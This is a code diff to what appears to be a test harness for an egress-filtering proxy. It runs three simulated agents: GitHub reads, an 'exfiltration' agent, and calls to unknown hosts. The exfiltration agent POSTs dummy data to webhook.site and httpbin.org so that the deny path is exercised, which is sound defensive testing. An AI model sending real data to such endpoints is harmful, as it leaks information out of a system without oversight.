@@ -117,40 +117,40 @@ $InitialMem = [math]::Round((Get-Process -Id $ProxyPid).WorkingSet64 / 1MB, 1)
 $AgentCodes = @(
     # Agent 1: GitHub read (Allow path)
     'import requests,time,random,os
-proxy=os.environ.get("HTTP_PROXY","http://host.docker.internal:8080")
-px={"http":proxy,"https":proxy}
+# Contained mode: DNAT routes 443 to MITM automatically.
+# Do NOT set proxies= — that forces CONNECT tunnel which bypasses DNAT.
 repos=["torvalds/linux","rust-lang/rust","golang/go","python/cpython"]
 for i in range(200):
     r=repos[i%len(repos)]
     try:
-        resp=requests.get(f"http://api.github.com/repos/{r}/issues?per_page=1",proxies=px,timeout=15)
+        resp=requests.get(f"https://api.github.com/repos/{r}/issues?per_page=1",timeout=15)
         print(f"[{i}] GET {r}/issues -> {resp.status_code}")
     except Exception as e: print(f"[{i}] ERR: {e}")
     time.sleep(random.uniform(10,25))',
     # Agent 2: Exfiltration (Deny path)
     'import requests,time,random,os
-proxy=os.environ.get("HTTP_PROXY","http://host.docker.internal:8080")
-px={"http":proxy,"https":proxy}
+# Contained mode: DNAT routes 443 to MITM automatically.
+# Do NOT set proxies= — that forces CONNECT tunnel which bypasses DNAT.
 targets=["http://webhook.site/test","http://httpbin.org/post"]
 for i in range(200):
     url=random.choice(targets)
     try:
-        resp=requests.post(url,json={"d":f"s{i}"},proxies=px,timeout=15)
+        resp=requests.post(url,json={"d":f"s{i}"},timeout=15)
         print(f"[{i}] POST {url} -> {resp.status_code}")
     except Exception as e: print(f"[{i}] ERR: {e}")
     time.sleep(random.uniform(10,25))',
     # Agent 3: Unknown hosts (Default-to-Caution, high volume)
     'import requests,time,random,os
-proxy=os.environ.get("HTTP_PROXY","http://host.docker.internal:8080")
-px={"http":proxy,"https":proxy}
-urls=["http://catfact.ninja/fact","http://dog.ceo/api/breeds/image/random",
-"http://api.coindesk.com/v1/bpi/currentprice.json","http://numbersapi.com/42",
+# Contained mode: DNAT routes 443 to MITM automatically.
+# Do NOT set proxies= — that forces CONNECT tunnel which bypasses DNAT.
+urls=["https://catfact.ninja/fact","https://dog.ceo/api/breeds/image/random",
+"https://api.coindesk.com/v1/bpi/currentprice.json","http://numbersapi.com/42",
 "http://api.agify.io/?name=test","http://api.genderize.io/?name=test",
 "http://api.chucknorris.io/jokes/random","http://worldtimeapi.org/api/ip"]
 for i in range(300):
     url=random.choice(urls)
     try:
-        resp=requests.get(url,proxies=px,timeout=15)
+        resp=requests.get(url,timeout=15)
         print(f"[{i}] GET {url} -> {resp.status_code}")
     except Exception as e: print(f"[{i}] ERR: {e}")
     time.sleep(random.uniform(5,12))'
